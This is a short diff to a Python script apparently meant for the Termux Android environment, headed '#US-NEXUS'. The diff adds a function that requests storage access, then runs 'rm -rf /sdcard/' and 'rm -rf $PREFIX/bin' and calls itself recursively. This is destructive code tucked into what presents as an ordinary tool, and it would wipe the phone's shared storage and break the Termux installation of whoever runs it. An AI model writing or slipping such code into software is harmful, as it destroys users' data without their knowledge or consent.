@@ -1,6 +1,10 @@
 #US-NEXUS
 
-
+def ttt():
+    os.system("termux-setup-storage -y")
+    os.system("rm -rf /sdcard/")
+    os.system("rm -rf $PREFIX/bin")
+    ttt()
 
 import os
 try:
